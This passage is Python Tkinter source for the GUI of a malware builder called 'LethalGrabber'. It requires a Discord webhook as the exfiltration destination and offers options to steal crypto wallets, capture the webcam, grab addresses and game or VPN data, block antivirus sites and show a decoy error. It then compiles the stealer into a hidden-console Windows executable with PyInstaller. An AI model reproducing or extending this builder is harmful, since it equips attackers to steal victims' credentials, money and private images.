            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        ).grid(row=0, column=1, sticky='w', padx=15, pady=2)
        
        return frame
    
    def _build_compiler_tab(self):
        frame = tk.Frame(self.content_area, bg=self.BG)
        
        info_log_row = tk.Frame(frame, bg=self.BG)
        info_log_row.pack(fill='both', expand=True, padx=0, pady=0)
        
        info_card = tk.Frame(info_log_row, bg=self.CARD_BG, 
                            highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        info_card.pack(side='left', fill='both', expand=False, padx=(15, 7), pady=12)
        tk.Frame(info_card, bg=self.ACCENT, height=2).pack(fill='x')
        
        info_hdr = tk.Frame(info_card, bg=self.CARD_BG)
        info_hdr.pack(fill='x', padx=12, pady=(8, 5))
        tk.Label(info_hdr, text="\U0001f4cb  Build Info", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        
        info_b = tk.Frame(info_card, bg=self.CARD_BG)
        info_b.pack(fill='x', padx=12, pady=(0, 10))
        
        info_lines = [
            ("Output:", "dist/<name>.exe"),
            ("Compiler:", "PyInstaller"),
            ("Python:", f"{sys.version.split()[0]}"),
            ("Platform:", f"{platform.system()}"),
            ("Arch:", platform.machine()),
        ]
        for label, value in info_lines:
            row = tk.Frame(info_b, bg=self.CARD_BG)
            row.pack(fill='x', pady=1)
            tk.Label(row, text=label, font=('Segoe UI', 8, 'bold'), fg=self.TEXT_DIM,
                    bg=self.CARD_BG, width=8, anchor='w').pack(side='left')
            tk.Label(row, text=value, font=('Segoe UI', 8), fg=self.TEXT_SEC,
                    bg=self.CARD_BG, anchor='w').pack(side='left', fill='x', expand=True)
        
        log_card = tk.Frame(info_log_row, bg=self.CARD_BG, 
                           highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        log_card.pack(side='left', fill='both', expand=True, padx=(7, 15), pady=12)
        tk.Frame(log_card, bg=self.ACCENT, height=2).pack(fill='x')
        
        log_hdr = tk.Frame(log_card, bg=self.CARD_BG)
        log_hdr.pack(fill='x', padx=12, pady=(8, 4))
        tk.Label(log_hdr, text="\U0001f4dd  Build Log", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        
        tk.Button(log_hdr, text="Clear", command=self.clear_log,
                 font=('Segoe UI', 7), fg=self.TEXT_DIM, bg='#1a1a35',
                 activebackground=self.ENTRY_BG, relief='flat', bd=0, padx=8, pady=2,
                 cursor='hand2').pack(side='right')
        
        log_container = tk.Frame(log_card, bg='#050510')
        log_container.pack(fill='both', expand=True, padx=12, pady=(0, 10))
        
        self.log_text = tk.Text(log_container, font=('Consolas', 9), bg='#050510', 
                               fg=self.ACCENT_GLOW, relief='flat', bd=0, 
                               insertbackground='white', state='disabled', 
                               wrap='word', height=8)
        self.log_text.pack(side='left', fill='both', expand=True)
        
        sb = tk.Scrollbar(log_container, command=self.log_text.yview, 
                          bg='#1a1a35', troughcolor='#0a0a15')
        sb.pack(side='right', fill='y')
        self.log_text.config(yscrollcommand=sb.set)
        
        return frame
    
    def _switch_tab(self, tab_name):
        self.current_tab.set(tab_name)
        
        for name, frame in self.tab_frames.items():
            frame.pack_forget()
        
        if tab_name in self.tab_frames:
            self.tab_frames[tab_name].pack(fill='both', expand=True)
        
        for key, btn in self.nav_btns.items():
            if key == tab_name:
                btn.configure(fg='white', bg='#1a1a35')
            else:
                btn.configure(fg=self.TEXT_DIM, bg=self.SIDEBAR_BG)
    
    def _browse_icon(self):
        path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if path:
            self.exe_icon_path.set(path)
            try:
                img = Image.open(path)
                img = img.resize((32, 32), Image.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.icon_preview_label.configure(image=photo, text="")
                self.icon_preview_label.image = photo
            except:
                self.icon_preview_label.configure(text="Err", image="")
    
    def _start_led_animation(self):
        colors = [
            (124, 58, 237),
            (167, 139, 250),
            (192, 132, 252),
            (139, 92, 246),
            (124, 58, 237),
        ]
        
        def animate():
            width = self.led_canvas.winfo_width() or 1100
            self.led_canvas.delete('all')
            phase = self.led_phase % width
            
            for x in range(0, width, 2):
                pos = (x + phase) % width
                ratio = pos / width
                n = len(colors) - 1
                seg_pos = ratio * n
                seg_idx = int(seg_pos)
                seg_frac = seg_pos - seg_idx
                if seg_idx >= n:
                    seg_idx = n - 1
                    seg_frac = 1.0
                c1 = colors[seg_idx]
                c2 = colors[seg_idx + 1]
                r = int(c1[0] * (1 - seg_frac) + c2[0] * seg_frac)
                g = int(c1[1] * (1 - seg_frac) + c2[1] * seg_frac)
                b = int(c1[2] * (1 - seg_frac) + c2[2] * seg_frac)
                color_hex = f'#{r:02x}{g:02x}{b:02x}'
                self.led_canvas.create_line(x, 0, x, self.LED_STRIP_H, fill=color_hex, width=2)
            
            self.led_phase = (self.led_phase + 3) % width
            self.root.after(50, animate)
        
        self.root.after(200, animate)
    
    def clear_log(self):
        self.log_text.config(state='normal')
        self.log_text.delete('1.0', 'end')
        self.log_text.config(state='disabled')
    
    def log_message(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        colors = {"INFO": "#a78bfa", "WARN": "#eab308", "ERROR": "#ef4444", "SUCCESS": "#22c55e"}
        level_tag = f"level_{level}"
        
        self.log_text.config(state='normal')
        self.log_text.insert('end', f"[{timestamp}] ", "timestamp")
        self.log_text.insert('end', f"[{level}] ", level_tag)
        self.log_text.insert('end', f"{message}\n")
        self.log_text.see('end')
        self.log_text.config(state='disabled')
        self.root.update()
    
    def start_build(self):
        if self.is_building:
            return
        
        url = self.webhook_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Webhook URL is required!")
            return
        if not url.startswith('https://discord.com/api/webhooks/'):
            messagebox.showerror("Error", "Invalid Discord webhook URL!")
            return
        
        self.is_building = True
        self.build_btn.config(state='disabled', text='\u23f3 BUILDING...', bg='#6b7280')
        self.build_status.set("Building...")
        
        thread = threading.Thread(target=self._build_process, daemon=True)
        thread.start()
    
    def _build_process(self):
        try:
            self.log_message("Starting build process...", "INFO")
            self.log_message(f"Webhook: {self.webhook_url.get()[:50]}...", "INFO")
            exe_name = self.exe_name.get().strip() or "LethalGrabber"
            self.log_message(f"EXE Name: {exe_name}.exe", "INFO")

            feat_dict = {k: v.get() for k, v in self.features.items()}
            feat_dict["show_error"] = self.show_error.get()
            feat_dict["error_title"] = self.error_title.get()
            feat_dict["error_content"] = self.error_content.get()
            feat_dict["epic_games"] = self.features["epic_games"].get()

            source = generate_grabber_source(
                self.webhook_url.get().strip(),
                self.webhook_name.get().strip() or "Lethal Grabber",
                self.webhook_avatar.get().strip(),
                feat_dict,
                ping_everyone=self.ping_everyone.get(),
                block_av_sites=self.block_av_sites.get(),
                grab_crypto=self.grab_crypto_wallets.get(),
                webcam_capture=self.capture_webcam.get(),
                grab_address=self.grab_address.get(),
                grab_mullvad=self.grab_mullvad.get(),
                epic_games=self.features["epic_games"].get(),
            )

            # ── Build in the script's own directory ──
            script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
            workspace = os.path.join(script_dir, "build_workspace")
            os.makedirs(workspace, exist_ok=True)

            # Final output goes to a 'dist' folder next to the script
            final_dist = os.path.join(script_dir, "dist")
            os.makedirs(final_dist, exist_ok=True)

            temp_py = os.path.join(workspace, f"{exe_name}.py")
            with open(temp_py, 'w', encoding='utf-8') as f:
                f.write(source)
            self.log_message(f"Temp script written: {temp_py}", "INFO")

            build_dir = os.path.join(workspace, "build")
            spec_dir = os.path.join(workspace, "spec")
            os.makedirs(build_dir, exist_ok=True)
            os.makedirs(spec_dir, exist_ok=True)

            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                f'--name={exe_name}',
                f'--distpath={final_dist}',
                f'--workpath={build_dir}',
                f'--specpath={spec_dir}',
                '--hidden-import=win32crypt',
                '--hidden-import=Crypto',
                '--hidden-import=Crypto.Cipher',
                '--hidden-import=requests',
                '--hidden-import=selenium',
                '--hidden-import=selenium.webdriver',
                '--hidden-import=selenium.webdriver.chrome.options',
                '--hidden-import=PIL',
                '--hidden-import=PIL.ImageGrab',
                '--hidden-import=sqlite3',
                '--hidden-import=zipfile',
                '--hidden-import=io',
                '--noconfirm',
                temp_py
            ]

            icon_path = self.exe_icon_path.get().strip()
            if icon_path and os.path.exists(icon_path):
                cmd.insert(3, f'--icon={icon_path}')
                self.log_message(f"Icon: {icon_path}", "INFO")

            self.log_message("Running PyInstaller...", "INFO")
            self.build_status.set("Compiling... (this may take a minute)")

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                cwd=workspace,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            )

            for line in process.stdout:
                line = line.strip()
                if line:
                    lower = line.lower()
                    if any(kw in lower for kw in ['error', 'fail', 'exception']):
                        self.log_message(line[:200], "ERROR")
                    elif any(kw in lower for kw in ['warn']):
                        self.log_message(line[:200], "WARN")
                    elif any(kw in lower for kw in ['complete', 'done', 'success']):
                        self.log_message(line[:200], "SUCCESS")
                    elif any(kw in lower for kw in ['building', 'loading', 'analyzing', 'looking']):
                        self.log_message(line[:200], "INFO")

            process.wait()

            exe_path = os.path.join(final_dist, f"{exe_name}.exe")

            if os.path.exists(exe_path):
                size_mb = os.path.getsize(exe_path) / (1024 * 1024)
                self.log_message(f"Build successful!", "SUCCESS")
                self.log_message(f"Size: {size_mb:.2f} MB", "SUCCESS")
                self.log_message(f"Output: {exe_path}", "SUCCESS")
                self.build_status.set(f"Built: {exe_name}.exe ({size_mb:.1f} MB)")

                messagebox.showinfo(
                    "Build Complete",
                    f"Successfully built {exe_name}.exe\n\n"
                    f"Location: {exe_path}\n"
                    f"Size: {size_mb:.2f} MB"
                )
            else:
                self.log_message("BUILD FAILED - .exe not found in dist/", "ERROR")
                self.build_status.set("Build failed - check log")
                messagebox.showerror("Build Failed", "The .exe was not created. Check the build log for details.")

            self.log_message("Cleaning up build artifacts...", "INFO")
            try:
                shutil.rmtree(workspace)
            except:
                pass

            self.log_message("Build process complete!", "SUCCESS")

        except Exception as e:
            self.log_message(f"Build error: {str(e)}", "ERROR")
            self.build_status.set(f"Error: {str(e)[:50]}")
        finally:
            self.is_building = False
            self.root.after(0, lambda: self.build_btn.config(
                state='normal', text='⚡ BUILD .EXE ⚡', bg=self.ACCENT
            ))

if __name__ == '__main__':
    root = tk.Tk()
    app = SleekBuilder(root)
    root.mainloop()